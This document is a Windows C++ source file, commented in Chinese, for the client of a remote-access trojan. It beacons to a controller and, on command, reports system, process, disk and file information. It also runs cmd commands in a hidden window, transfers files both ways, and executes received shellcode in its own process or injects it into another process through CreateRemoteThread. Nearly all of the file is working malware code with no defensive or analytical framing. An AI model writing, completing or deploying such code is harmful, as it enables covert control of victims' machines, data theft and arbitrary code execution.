#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <iostream>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <string>
#include <TlHelp32.h>
#include <shlobj.h>
#include <tchar.h>
#include <WinInet.h>
#include <vector>

#pragma comment(lib, "WinInet.lib")
#pragma comment(lib,"ws2_32.lib")

using namespace std;

// -------------------------------------------------------------
// 获取CPU相关函数
// -------------------------------------------------------------
typedef struct
{
	UCHAR szCPU[16];
	UINT uCPUID;
	DWORD idle;
	DWORD kernel;
	DWORD user;
	DWORD cpu;
}CpuInfo;

// 获取CPU利用率
__int64 CompareFileTime(FILETIME time1, FILETIME time2)
{
	__int64 a = time1.dwHighDateTime << 32 | time1.dwLowDateTime;
	__int64 b = time2.dwHighDateTime << 32 | time2.dwLowDateTime;
	return   (b - a);
}

// 获取CPU利用率
CpuInfo SendCPUInfo()
{
	BYTE szCPU[16] = { 0 }; //定义存放CPU类型的数组
	UINT uCPUID = 0U;       //定义存放CPU ID的数组
	CpuInfo ref_info = { 0 };

	// 得到CPU型号和序列号
	_asm
	{
		mov eax, 0
			cpuid
			mov dword ptr szCPU[0], ebx
			mov dword ptr szCPU[4], edx
			mov dword ptr szCPU[8], ecx
			mov eax, 1
			cpuid
			mov uCPUID, edx
	}

	// 得到CPU负载
	HANDLE hEvent;
	BOOL res;
	FILETIME preidleTime, prekernelTime, preuserTime, idleTime, kernelTime, userTime;

	res = GetSystemTimes(&idleTime, &kernelTime, &userTime);
	preidleTime = idleTime;
	prekernelTime = kernelTime;
	preuserTime = userTime;

	hEvent = CreateEvent(NULL, FALSE, FALSE, NULL);

	WaitForSingleObject(hEvent, 300);
	res = GetSystemTimes(&idleTime, &kernelTime, &userTime);

	DWORD idle = CompareFileTime(preidleTime, idleTime);
	DWORD kernel = CompareFileTime(prekernelTime, kernelTime);
	DWORD user = CompareFileTime(preuserTime, userTime);
	DWORD cpu = (kernel + user - idle) * 100 / (kernel + user);

	preidleTime = idleTime;
	prekernelTime = kernelTime;
	preuserTime = userTime;

	// 赋值到临时变量
	ref_info.cpu = cpu;
	ref_info.idle = idle;
	ref_info.kernel = kernel;
	ref_info.user = user;
	ref_info.uCPUID = uCPUID;

	strncpy((char *)&ref_info.szCPU, (char *)szCPU, 16);

	return ref_info;
}

// -------------------------------------------------------------
// 获取内存相关函数
// -------------------------------------------------------------
typedef struct
{
	ULONG Total;
	ULONG Free;
	ULONG Used;
}MemoryInfo;

// 获取内存数据并返回字典格式
MemoryInfo SendMemoryInfo()
{
	MEMORYSTATUSEX WinMemStat;
	MemoryInfo ref_info = { 0 };

	WinMemStat.dwLength = sizeof(MEMORYSTATUSEX);
	BOOL ref = ::GlobalMemoryStatusEx(&WinMemStat);
	if (ref == 1)
	{
		int nMemCount = WinMemStat.ullTotalPhys / 1024 / 1024;     // 总内存数，单位MB
		int nFreeMem = WinMemStat.ullAvailPhys / 1024 / 1024;      // 可用内存数，单位MB
		int nUsedMem = nMemCount - nFreeMem;

		ref_info.Free = nFreeMem;
		ref_info.Total = nMemCount;
		ref_info.Used = nUsedMem;
	}
	return ref_info;
}

// -------------------------------------------------------------
// 获取系统进程列表
// -------------------------------------------------------------

typedef struct
{
	DWORD Is64;
	DWORD PID;
	CHAR ProcessName[2048];
}ProcessList;

std::vector<ProcessList> process_list_vect;

BOOL Is64BitPorcess(DWORD dwProcessID)
{
	HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, dwProcessID);
	if (hProcess)
	{
		typedef BOOL(WINAPI* LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
		LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandleW(L"kernel32"), "IsWow64Process");
		if (NULL != fnIsWow64Process)
		{
			BOOL bIsWow64 = FALSE;
			fnIsWow64Process(hProcess, &bIsWow64);
			CloseHandle(hProcess);
			if (bIsWow64)
				return FALSE;
			else
				return TRUE;
		}
	}
	return FALSE;
}

// 枚举系统中进程的令牌权限信息
BOOL EnumProcess()
{
	HANDLE SnapShot;
	PROCESSENTRY32 pe32;

	// 拍摄快照
	SnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	pe32.dwSize = sizeof(PROCESSENTRY32);

	if (Process32First(SnapShot, &pe32) == FALSE)
		return FALSE;

	while (1)
	{
		if (Process32Next(SnapShot, &pe32) == FALSE)
			return FALSE;

		bool is_64 = Is64BitPorcess(pe32.th32ParentProcessID);

		ProcessList ptr;

		ptr.Is64 = is_64;
		ptr.PID = pe32.th32ProcessID;

		// sprintf(ptr.ProcessName, "%S", pe32.szExeFile);
		strcpy(ptr.ProcessName, pe32.szExeFile);
		process_list_vect.push_back(ptr);
	}

	return TRUE;
}

// -------------------------------------------------------------
// 代码注入部分
// -------------------------------------------------------------
typedef struct
{
	DWORD PID;
	char ShellCode[4096];
}InjectCode;

// 注入代码到自身进程
void InjectSelfCode(char* shellcode)
{
	unsigned int char_in_hex;
	unsigned int iterations = strlen(shellcode);

	unsigned int memory_allocation = strlen(shellcode) / 2;

	for (unsigned int i = 0; i < iterations - 1; i++)
	{
		sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
		shellcode[i] = (char)char_in_hex;
	}

	void* exec = VirtualAlloc(0, memory_allocation, MEM_COMMIT, PAGE_READWRITE);
	memcpy(exec, shellcode, memory_allocation);
	DWORD ignore;
	VirtualProtect(exec, memory_allocation, PAGE_EXECUTE, &ignore);
	(*(void(*)()) exec)();
}

// 将shellcode注入到远程进程
bool InjectRemoteCode(DWORD pid, char* shellcode)
{
	HANDLE Handle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	unsigned char source[8192] = { 0 };

	unsigned int char_in_hex;
	unsigned int iterations = strlen(shellcode);
	unsigned int memory_allocation = strlen(shellcode) / 2;

	for (unsigned int i = 0; i < iterations - 1; i++)
	{
		sscanf(shellcode + 2 * i, "%2X", &char_in_hex);
		source[i] = (char)char_in_hex;
	}

	printf("[*] 开始注入进程PID => %d \n", pid, memory_allocation);
	Handle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

	if (Handle != NULL)
	{
		printf("[+] 打开进程: %d \n", Handle);
	}
	else
	{
		printf("[-] 打开进程失败\n");
		return false;
	}

	remoteBuffer = VirtualAllocEx(Handle, NULL, sizeof(source), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	if (remoteBuffer != NULL)
	{
		printf("[+] 已设置权限: %d \n", remoteBuffer);
	}
	else
	{
		printf("[-] 设置权限失败 \n");
		return false;
	}

	WriteProcessMemory(Handle, remoteBuffer, source, sizeof(source), NULL);
	remoteThread = CreateRemoteThread(Handle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	if (remoteThread != NULL)
	{
		printf("[*] 创建线程ID => %d \n", remoteThread);
	}
	else
	{
		printf("[-] 线程启动失败 \n");
		return false;
	}
	CloseHandle(Handle);
	return true;
}

// -------------------------------------------------------------
// 获取系统磁盘个数与容量
// -------------------------------------------------------------

// 将字节转换为GB单位显示的宏定义
#define ToGB(x) (x.HighPart << 2) + (x.LowPart >> 20) / 1024.0

// 定义基础结构
typedef struct
{
	double available_space;
	double free_space;
	double total_space;
}DriverInfo;

// 定义完整结构
typedef struct
{
	char driver_name[128];
	char driver_type[128];
	double available_space;
	double free_space;
	double total_space;
}MyDriver;

// 获取驱动器数量
int GutDrivesCount()
{
	DWORD drivers;
	int count = 0;

	//获取驱动器数
	drivers = GetLogicalDrives();
	while (drivers != 0)
	{
		if (drivers & 1 != 0)
		{
			count++;
		}
		drivers >>= 1;
	}
	return count;
}

// 获取驱动器类型
std::string GetDrivesType(const char* lpRootPathName)
{
	UINT uDriverType = GetDriveType(lpRootPathName);
	switch (uDriverType)
	{
	case DRIVE_UNKNOWN:
		return "未知类型"; break;
	case DRIVE_NO_ROOT_DIR:
		return "路径无效"; break;
	case DRIVE_REMOVABLE:
		return "可移动磁盘"; break;
	case DRIVE_FIXED:
		return "固定磁盘"; break;

	case DRIVE_REMOTE:
		return "网络磁盘"; break;
	case DRIVE_CDROM:
		return "光驱设备"; break;
	case DRIVE_RAMDISK:
		return "内存映射盘"; break;
	default:
		break;
	}
	return "错误参数";
}

// 获取盘符容量
DriverInfo GetDrivesFreeSpace(const char* lpRootPathName)
{
	// ULARGE_INTEGER 64位无符号整型值
	ULARGE_INTEGER available, total, free;
	DriverInfo ref;

	// 获取分区数据并返回DriversInfo结构体
	if (GetDiskFreeSpaceEx(lpRootPathName, (ULARGE_INTEGER*)&available, (ULARGE_INTEGER*)&total, (ULARGE_INTEGER*)&free))
	{
		ref.total_space = ToGB(total);
		ref.free_space = ToGB(available);
		ref.available_space = ref.total_space - ref.free_space;
	}
	return ref;
}

std::vector<MyDriver> GetDriveForVector()
{
	DWORD count = GutDrivesCount();
	std::cout << "驱动器个数: " << count << std::endl;

	DWORD dwSize = MAX_PATH;
	char szLogicalDrives[MAX_PATH] = { 0 };

	// 获取逻辑驱动器号字符串
	DWORD dwResult = GetLogicalDriveStrings(dwSize, szLogicalDrives);

	// 处理获取到的结果
	if (dwResult > 0 && dwResult <= MAX_PATH)
	{
		// 定义两个结构, MyDriver 临时存储单个结构,ref存储所有磁盘的容器
		MyDriver my_driver_ptr;
		std::vector<MyDriver> ref;

		// 从缓冲区起始地址开始
		char* szSingleDrive = szLogicalDrives;

		while (*szSingleDrive)
		{
			// 逻辑驱动器类型
			std::string type = GetDrivesType(szSingleDrive);

			// 获取磁盘空间信息并存入 DriverInfo 结构
			DriverInfo ptr;
			ptr = GetDrivesFreeSpace(szSingleDrive);

			// 填充结构数据
			strcpy(my_driver_ptr.driver_name, szSingleDrive);
			strcpy(my_driver_ptr.driver_type, type.c_str());
			my_driver_ptr.total_space = ptr.total_space;
			my_driver_ptr.free_space = ptr.free_space;
			my_driver_ptr.available_space = ptr.available_space;

			// 加入到容器中
			ref.push_back(my_driver_ptr);
			
			std::cout
			<< "盘符: " << szSingleDrive
			<< " 类型: " << type
			<< " 总容量: " << ptr.total_space
			<< " 可用空间: " << ptr.free_space
			<< " 已使用: " << ptr.available_space
			<< std::endl;
			
			// 获取下一个驱动器号起始地址
			szSingleDrive += strlen(szSingleDrive) + 1;
		}
		return ref;
	}
}

// -------------------------------------------------------------
// 获取磁盘文件列表
// -------------------------------------------------------------
typedef struct
{
	char szFilePath[4095];
	char szFileName[2048];
	long long szFileSize;
}FileInfo;

// 获取文件大小
int GetFileSize(std::string FileName)
{
	FILE* pointer = NULL;
	pointer = fopen(FileName.c_str(), "rb");
	if (pointer != NULL)
	{
		fseek(pointer, 0, SEEK_END);
		int size = ftell(pointer);
		fclose(pointer);
		return size;
	}
	return 0;
}

bool SearchFile(char *pszDirectory, std::vector<FileInfo> &vect)
{
	// 搜索指定类型文件
	char *pszFileName = NULL;
	char *pTempSrc = NULL;
	WIN32_FIND_DATA FileData = { 0 };

	// 申请动态内存
	pszFileName = new char[2048];
	pTempSrc = new char[2048];

	// 构造搜索文件类型字符串 *.* 表示搜索所有文件类型
	wsprintf(pszFileName, "%s\\*.*", pszDirectory);

	HANDLE hFile = ::FindFirstFile(pszFileName, &FileData);
	if (INVALID_HANDLE_VALUE != hFile)
	{
		do
		{
			// 过滤掉当前目录"." 和上一层目录".."
			if ('.' == FileData.cFileName[0])
				continue;

			// 拼接文件路径    
			wsprintf(pTempSrc, "%s\\%s", pszDirectory, FileData.cFileName);

			// 判断是否是目录还是文件
			if (FileData.dwFileAttributes & FILE_ATTRIBUTE_ARCHIVE || FILE_ATTRIBUTE_DIRECTORY)
			{
				FileInfo info;

				char drive[_MAX_DRIVE], dir[_MAX_DIR], fname[_MAX_FNAME], ext[_MAX_EXT];
				_splitpath(pTempSrc, drive, dir, fname, ext);

				// 拷贝完整路径
				strcpy(info.szFilePath, pTempSrc);

				// 拼接完整文件名
				char sz_file_name[128] = { 0 };
				strcat(sz_file_name, fname);
				strcat(sz_file_name, ext);
				strcpy(info.szFileName, sz_file_name);

				// 得到文件长度并发送给服务端
				long long file_size = GetFileSize(pTempSrc);
				info.szFileSize = file_size;

				// std::cout << "文件路径: " << info.szFilePath << " 文件名: " << info.szFileName << std::endl;
				vect.push_back(info);
			}
		} while (::FindNextFile(hFile, &FileData));
	}
	FindClose(hFile);
	delete[]pTempSrc;
	delete[]pszFileName;

	return true;
}

// -------------------------------------------------------------
// 匿名管道执行CMD部分
// -------------------------------------------------------------





// 以隐藏方式执行CMD命令
int HideRunCmd(char* cmdStr, char* message)
{
	DWORD readByte = 0;
	char command[1024] = { 0 };
	char buf[8192] = { 0 };    //缓冲区

	HANDLE hRead, hWrite;
	STARTUPINFO si;         // 启动配置信息
	PROCESS_INFORMATION pi; // 进程信息
	SECURITY_ATTRIBUTES sa; // 管道安全属性

	// 拼接 cmd 命令
	sprintf(command, "cmd.exe /c %s", cmdStr);
	// printf("-- CMD 命令: [%s]n", command);

	// 配置管道安全属性
	sa.nLength = sizeof(sa);
	sa.bInheritHandle = TRUE; // 管道句柄是可被继承的
	sa.lpSecurityDescriptor = NULL;

	// 创建匿名管道，管道句柄是可被继承的
	if (!CreatePipe(&hRead, &hWrite, &sa, 1024))
	{
		printf("管道创建失败! Error: %xn", (unsigned int)GetLastError());
		return 1;
	}

	// 配置 cmd 启动信息
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);                                       // 获取兼容大小
	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
	si.wShowWindow = SW_HIDE;                                 // 隐藏窗口启动
	si.hStdOutput = si.hStdError = hWrite;                    // 输出流和错误流指向管道写的一头

	// 创建子进程,运行命令,子进程是可继承的
	if (!CreateProcess(
		NULL,       // 不传程序路径, 使用命令行
		command,    // 命令行命令
		NULL,       // 不继承进程句柄(默认)
		NULL,       // 不继承线程句柄(默认)
		TRUE,       // 继承句柄
		0,          // 没有创建标志(默认)
		NULL,       // 使用默认环境变量
		NULL,       // 使用父进程的目录
		&si,        // STARTUPINFO 结构存储启动信息
		&pi))       // PROCESS_INFORMATION 保存启动后的进程相关信息
	{
		printf("创建进程失败! Error: %x \n", (unsigned int)GetLastError());
		CloseHandle(hRead);
		CloseHandle(hWrite);
		return 1;
	}
	CloseHandle(hWrite);

	/*
	管道的 write 端句柄已被 cmd 的输出流和错误流继承,即 cmd 输出时会把数据写入管道。
	我们通过读取管道的 read 端，就可以获得 cmd 的输出
	*/
	while (ReadFile(hRead, buf, 8192, &readByte, NULL))
	{
		strcat(message, buf);
		ZeroMemory(buf, 8192);
	}

	//printf("-- [CMD] Message: [%s] Length:%d n", message, strlen(message) + 1);
	CloseHandle(hRead);
	return 0;
}

// -------------------------------------------------------------
// 发送接收文件部分
// -------------------------------------------------------------

// 传入路径得到文件名
char* GetFileName(char* Path)
{
	if (strchr(Path, '\\'))
	{
		char ch = '\\';
		char* ref = strrchr(Path, ch) + 1;
		return ref;
	}
	else
	{
		char ch = '/';
		char* ref = strrchr(Path, ch) + 1;
		return ref;
	}
}

// 获取文件大小
int MyGetFileSize(std::string FileName)
{
	FILE* pointer = NULL;
	pointer = fopen(FileName.c_str(), "rb");
	if (pointer != NULL)
	{
		fseek(pointer, 0, SEEK_END);
		int size = ftell(pointer);
		fclose(pointer);
		return size;
	}
	return 0;
}

// 接收文件
bool RecvFile(SOCKET ptr, char* LocalPath, char* RemoteFile)
{
	// 发送需要下载的文件路径
	send(ptr, RemoteFile, strlen(RemoteFile), 0);

	// 接收文件长度
	long long file_size = 0;
	recv(ptr, (char*)&file_size, sizeof(int), 0);
	if (file_size <= 0)
	{
		return false;
	}

	// 保存文件到指定目录下
	char *file_name = GetFileName(RemoteFile);
	char file_all_name[1024] = { 0 };

	strcat(file_all_name, LocalPath);
	strcat(file_all_name, file_name);

	std::cout << "生成保存路径: " << file_all_name << std::endl;
	FILE* pointer = fopen(file_all_name, "wb");
	char buffer[1024] = { 0 };

	if (pointer != NULL)
	{
		long long length = 0;
		long long total_length = 0;

		// 循环接收字节数据,每次接收1024字节
		while ((length = recv(ptr, buffer, 1024, 0)) > 0)
		{
			// 写出文件并判断是否写出成功
			if (fwrite(buffer, sizeof(char), length, pointer) < length)
			{
				break;
			}

			// 每次累加递增
			total_length += length;
			memset(buffer, 0, 1024);

			// 判断文件长度是否全部接收完毕
			if (total_length >= file_size)
			{
				std::cout << "文件接收完毕, 接收字节数: " << total_length << std::endl;
				fclose(pointer);
				return true;
			}
		}
		fclose(pointer);
	}
	return false;
}

// 发送指定文件
bool SendFile(SOCKET ptr)
{
	// 接收文件路径
	char file_path[1024] = { 0 };
	recv(ptr, file_path, 1024, 0);

	// 得到文件长度并发送给服务端
	long long file_size = MyGetFileSize(file_path);

	if (file_size <= 0)
	{
		return false;
	}
	send(ptr, (char*)&file_size, sizeof(int), 0);
	std::cout << "发送文件长度: " << file_size << std::endl;

	// 循环发送数据
	char buffer[1024] = { 0 };
	FILE* pointer = fopen(file_path, "rb");
	if (pointer != NULL)
	{
		long long length = 0;
		long long total_length = 0;

		// 循环发送数据
		while ((length = fread(buffer, sizeof(char), 1024, pointer)) > 0)
		{
			send(ptr, buffer, length, 0);
			memset(buffer, 0, 1024);
			total_length += length;
		}

		if (total_length == file_size)
		{
			return true;
		}
	}
	return false;
}









int main(int argc, char* argv[])
{
listen_:
	while (1)
	{
		WSADATA WSAData = { 0 };
		SOCKET sock = { 0 };
		struct sockaddr_in ClientAddr = { 0 };

		WSAStartup(MAKEWORD(2, 0), &WSAData);

		ClientAddr.sin_family = AF_INET;
		ClientAddr.sin_port = htons(8090);
		ClientAddr.sin_addr.s_addr = inet_addr("127.0.0.1");

		sock = socket(AF_INET, SOCK_STREAM, 0);
		int Ret = connect(sock, (LPSOCKADDR)&ClientAddr, sizeof(ClientAddr));

		if (Ret == 0)
		{
			while (1)
			{
				char buf[4096] = { 0 };

				memset(buf, 0, sizeof(buf));
				recv(sock, buf, 4096, 0);

				// 获取CPU数据
				if (strcmp(buf, "GetCPU") == 0)
				{
					CpuInfo send_cpu = SendCPUInfo();
					char send_buffer[8192] = { 0 };
					memcpy(send_buffer, &send_cpu, sizeof(CpuInfo));
					int ServerRet = send(sock, send_buffer, sizeof(CpuInfo), 0);
					if (ServerRet != 0)
					{
						std::cout << "发送CPU数据包" << std::endl;
					}
				}

				// 获取内存数据
				else if (strcmp(buf, "GetMemory") == 0)
				{
					MemoryInfo send_memory = SendMemoryInfo();
					char send_buffer[8192] = { 0 };
					memcpy(send_buffer, &send_memory, sizeof(CpuInfo));
					int ServerRet = send(sock, send_buffer, sizeof(CpuInfo), 0);
					if (ServerRet != 0)
					{
						std::cout << "发送内存数据包" << std::endl;
					}
				}

				// 发送进程列表
				else if (strcmp(buf, "GetProcessList") == 0)
				{
					BOOL flag = EnumProcess();

					// 首先发送数量
					DWORD count = process_list_vect.size();
					int ServerRet = send(sock, (char *)&count, sizeof(DWORD), 0);
					if (ServerRet != 0)
					{
						std::cout << "发送进程数量:" << count << std::endl;
					}

					// 接收进程数标志
					DWORD recv_count = 0;
					recv(sock, (char*)&recv_count, sizeof(DWORD), 0);

					std::cout << "接收进程数量:" << recv_count << std::endl;

					// 进程数一致则依次发送
					if (count == recv_count)
					{
						for (size_t i = 0; i < count; i++)
						{
							char send_buffer[sizeof(ProcessList)] = { 0 };

							memcpy(send_buffer, &process_list_vect[i], sizeof(ProcessList));
							send(sock, send_buffer, sizeof(ProcessList), 0);
						}
					}
					std::cout << "发送进程数据包" << std::endl;
				}

				// 发送磁盘数据
				else if (strcmp(buf, "GetDiskList") == 0)
				{
					std::vector<MyDriver> ptr = GetDriveForVector();

					// 首先发送数量
					DWORD count = ptr.size();
					int ServerRet = send(sock, (char *)&count, sizeof(DWORD), 0);
					if (ServerRet != 0)
					{
						std::cout << "发送数量:" << count << std::endl;
					}

					// 接收数量标志
					DWORD recv_count = 0;
					recv(sock, (char*)&recv_count, sizeof(DWORD), 0);

					std::cout << "接收数量:" << recv_count << std::endl;

					// 一致则依次发送数据包
					if (count == recv_count)
					{
						for (size_t i = 0; i < count; i++)
						{
							char send_buffer[sizeof(MyDriver)] = { 0 };

							memcpy(send_buffer, &ptr[i], sizeof(MyDriver));
							send(sock, send_buffer, sizeof(MyDriver), 0);
						}
					}
					std::cout << "发送进程数据包" << std::endl;
				}

				// 发送磁盘文件信息
				else if (strcmp(buf, "GetDiskFileList") == 0)
				{

					// 接收文件路径
					char RecvChar[8192] = { 0 };
					int RecvRet = recv(sock, RecvChar, sizeof(RecvChar), 0);
					printf("接收目录位置：%s \n", RecvChar);

					if (RecvRet != 0)
					{
						// 开始输出目录
						std::vector<FileInfo> ptr = {};

						bool search_flag = SearchFile(RecvChar, ptr);

						if (search_flag == TRUE)
						{

							// 首先发送数量
							DWORD count = ptr.size();
							int ServerRet = send(sock, (char *)&count, sizeof(DWORD), 0);
							if (ServerRet != 0)
							{
								std::cout << "发送数量:" << count << std::endl;
							}

							// 接收数量标志
							DWORD recv_count = 0;
							recv(sock, (char*)&recv_count, sizeof(DWORD), 0);
							std::cout << "接收数量:" << recv_count << std::endl;

							// 一致则依次发送数据包
							if (count == recv_count)
							{
								for (size_t i = 0; i < count; i++)
								{
									char send_buffer[sizeof(FileInfo)] = { 0 };

									memcpy(send_buffer, &ptr[i], sizeof(FileInfo));
									send(sock, send_buffer, sizeof(FileInfo), 0);
								}
							}
							std::cout << "发送进程数据包" << std::endl;
							for (int x = 0; x < ptr.size(); x++)
							{
								std::cout << "文件名: " << ptr[x].szFileName 
									<< " 文件大小: " << ptr[x].szFileSize 
									<<" 文件路径: " << ptr[x].szFilePath << std::endl;
							}
						}
					}
				}

				// 匿名管道执行CMD命令
				else if (strcmp(buf, "GetCommand") == 0)
				{

					// 接收文件路径
					char RecvChar[8192] = { 0 };
					char SendChar[8192] = { 0 };

					int RecvRet = recv(sock, RecvChar, sizeof(RecvChar), 0);
					printf("接收命令：%s \n", RecvChar);

					HideRunCmd(RecvChar, SendChar);
					printf("读入执行结果: %s \n", SendChar);

					int SendRet = send(sock, SendChar, sizeof(SendChar), 0);

					if (SendRet > 0)
					{
						printf("发送命令完成 \n");
					}
				}

				// 发送文件
				else if (strcmp(buf, "RecvFile") == 0)
				{
					bool ref = SendFile(sock);
					std::cout << "文件发送状态: " << ref << std::endl;
				}

				// 接收文件
				else if (strcmp(buf, "SendFile") == 0)
				{
					typedef struct
					{
						CHAR LocalPath[4096];
						CHAR RemotePath[4096];
					}SendFilePath;


					// 接收文件名
					char send_message[sizeof(SendFilePath)] = { 0 };
					recv(sock, send_message, sizeof(SendFilePath), 0);

					SendFilePath *msg = (SendFilePath *)send_message;


					std::cout << msg->LocalPath << std::endl;
					std::cout << msg->RemotePath << std::endl;

					// 接收远程msg->RemotePath放到本地的msg->LocalPath目录下
					bool ref = RecvFile(sock, msg->RemotePath, msg->LocalPath);
					std::cout << "文件发送状态: " << ref << std::endl;
				}

				// 获取ShellCode并注入到自身
				else if (strcmp(buf, "InjectSelfCode") == 0)
				{
					char recv_message[8192] = { 0 };

					recv(sock, recv_message, sizeof(InjectCode), 0);

					InjectCode* info = (InjectCode*)recv_message;

					printf("PID = %d \n", info->PID);
					printf("shellcode = %s \n", info->ShellCode);
					InjectSelfCode(info->ShellCode);
				}

				// 获取shellcode并注入到远程进程内
				else if (strcmp(buf, "InjectRemoteCode") == 0)
				{
					char recv_message[8192] = { 0 };

					recv(sock, recv_message, sizeof(InjectCode), 0);

					InjectCode* info = (InjectCode*)recv_message;

					printf("PID = %d \n", info->PID);
					printf("shellcode = %s \n", info->ShellCode);
					InjectRemoteCode(info->PID, info->ShellCode);
				}

				// 终止客户端
				else if (strcmp(buf, "Exit") == 0)
				{
					closesocket(sock);
					WSACleanup();
					exit(0);
				}

				// 存活探测信号
				else if (strcmp(buf, "Ping") == 0)
				{
					int ServerRet = send(sock, "Pong", 4, 0);
					if (ServerRet != 0)
					{
						std::cout << "Ping 存活探测..." << std::endl;
					}
				}

				// 服务端关闭消息
				else if (strcmp(buf, "CloseServer") == 0)
				{
					std::cout << "服务器断开了链接" << std::endl;
					closesocket(sock);
					WSACleanup();
					goto listen_;
				}
			}
		}
		closesocket(sock);
		WSACleanup();
		Sleep(5000);
	}
	return 0;
}